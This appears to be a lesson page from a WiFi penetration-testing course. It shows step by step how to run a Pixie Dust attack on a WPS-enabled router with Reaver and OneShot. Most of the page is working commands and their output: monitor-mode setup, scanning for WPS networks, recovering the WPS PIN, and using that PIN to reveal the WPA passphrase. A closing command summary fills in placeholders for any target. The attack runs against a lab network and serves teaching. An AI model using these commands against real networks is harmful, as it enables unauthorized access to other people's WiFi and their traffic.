---
title: Performing A Pixie Dust Attack
description: Performing A Pixie Dust Attack
date: '2026-09-21'
tags: []
published: true
slug: performing-a-pixie-dust-attack
category: wifi
folder: pixie-dust-attack-offline-cracking
order: 20
---
# Performing the Pixie Dust Attack

## What's the Goal?

Now that you understand _why_ Pixie Dust attacks work (predictable random numbers on vulnerable chipsets), let's actually run one. We'll cover two popular tools:

1. **Reaver**
2. **[OneShot](https://github.com/fulvius31/OneShot/tree/master)**

Both can exploit the same weaknesses — just with slightly different setup steps.

---

## Method 1: Using Reaver

### Step 1: Set Up Monitor Mode

```shellsession
iccys@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

iccys@htb[/htb]$ ifconfig mon0 up

iccys@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

### Step 2: Scan for WPS Networks

```shellsession
iccys@htb[/htb]$  airodump-ng mon0 --wps

 CH  3 ][ Elapsed: 1 min ][ 2024-06-16 19:32 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 86:FC:9F:5D:67:4E  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    HackMe 
```

We found a target: **HackMe**.

### Step 3: Run the Pixie Dust Attack

Use the `-K` (or `--pixie-dust`) flag:

```shellsession
iccys@htb[/htb]$ reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 86:FC:9F:5D:67:4E
[+] Received beacon from 86:FC:9F:5D:67:4E
WPS: A new PIN configured (timeout=0)
WPS: UUID - hexdump(len=16): [NULL]
WPS: PIN - hexdump_ascii(len=8):    
<SNIP>
 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x08098b13
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     fe3fce4475701deda27e52518cc8be56
 [*] PSK2:     2dc52385b199358cea1ad97d1995bca2
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  32552273

 [*] Time taken: 0 s 34 ms
```

🎉 **Success in just 34 milliseconds!** The PIN `32552273` was recovered. Notice the `ES1` and `ES2` values are all zeros — this confirms the router had the "always zero" nonce bug we covered earlier.

### Step 4: Use the Recovered PIN to Get the Password

```shellsession
iccys@htb[/htb]$ reaver -b 86:FC:9F:5D:67:4E -c 1 -p 32552273 -i mon0

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 86:FC:9F:5D:67:4E
[+] Received beacon from 86:FC:9F:5D:67:4E
[!] Found packet with bad FCS, skipping...
[+] Associated with 86:FC:9F:5D:67:4E (ESSID: HackMe)
[+] WPS PIN: '32552273'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackMe'
```

Done — the real WiFi password is revealed.

---

## Method 2: Using [OneShot](https://github.com/fulvius31/OneShot/tree/master)

### Step 1: Clean Up the Old Interface

Since we already used `mon0` for Reaver, remove it first to avoid conflicts:

```shellsession
iccys@htb[/htb]$ iw dev mon0 del
iccys@htb[/htb]$ iwconfig

eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

### Step 2: Set Up Monitor Mode (This Time with airmon-ng)

```shellsession
iccys@htb[/htb]$ airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    182 avahi-daemon
    198 wpa_supplicant
    213 avahi-daemon
    220 NetworkManager

PHY Interface   Driver      Chipset

phy1    wlan0       htb80211_chipset    HTB ChipSet of 802.11 radio(s) for mac80211

        (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
        (mac80211 station mode vif disabled for [phy1]wlan0)
```

Confirm it worked:

```shellsession
iccys@htb[/htb]$ iwconfig

eth0      no wireless extensions.

lo        no wireless extensions.

wlan0mon  IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

### Step 3: Run the Pixie Dust Attack with OneShot

OneShot uses the same `-K` flag:

```shellsession
iccys@htb[/htb]$ python3 /opt/OneShot/oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K

[*] Running wpa_supplicant¦
[*] Running wpa_supplicant¦
[*] Trying PIN '61212947'¦
[*] Scanning¦
<SNIP>
 [*] Seed N1:  0xb9d0ec1c
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     f83b96cd8204b73edf202c13232907f8
 [*] PSK2:     f67582674650eb5e9a84c42b9a078fcd
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  32552273

 [*] Time taken: 0 s 27 ms
```

🎉 Same result, same PIN (`32552273`), just using a different tool — this time in 27 milliseconds.

---

## Reaver vs. OneShot: Quick Comparison

|                    | Reaver                           | OneShot                             |
| ------------------ | -------------------------------- | ----------------------------------- |
| Monitor mode setup | `iw` command                     | `airmon-ng`                         |
| Pixie Dust flag    | `-K` or `--pixie-dust`           | `-K`                                |
| Language           | C                                | Python 3                            |
| Getting the PSK    | Needs a second command with `-p` | Can potentially get both in one run |

---

## Command Summary

```bash
# Reaver method
iw dev wlan0 interface add mon0 type monitor      # Create a monitor-mode interface
ifconfig mon0 up                                  # Turn it on
airodump-ng mon0 --wps                            # Scan for WPS networks
reaver -K 1 -vvv -b <BSSID> -c <channel> -i mon0  # Run the Pixie Dust attack
reaver -b <BSSID> -c <channel> -p <PIN> -i mon0   # Use the recovered PIN to get the password

# OneShot method
iw dev mon0 del                                    # Remove the old monitor interface
airmon-ng start wlan0                              # Create a new monitor interface via airmon-ng
python3 /opt/OneShot/oneshot.py -b <BSSID> -i wlan0mon -K   # Run the Pixie Dust attack
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`-K`, `--pixie-dust`|Run a Pixie Dust attack instead of standard brute-forcing|
|`-b <BSSID>`|Target router's MAC address|
|`-c <channel>`|The WiFi channel to use|
|`-i mon0` / `-i wlan0mon`|The monitor-mode interface to use|
|`-vvv`|Extra-verbose output (see all the technical details as they happen)|
|`-p <PIN>`|Use this specific PIN to retrieve the password|
|`interface add mon0 type monitor`|Create a new interface named `mon0` in monitor mode|
|`dev mon0 del`|Delete the `mon0` interface|
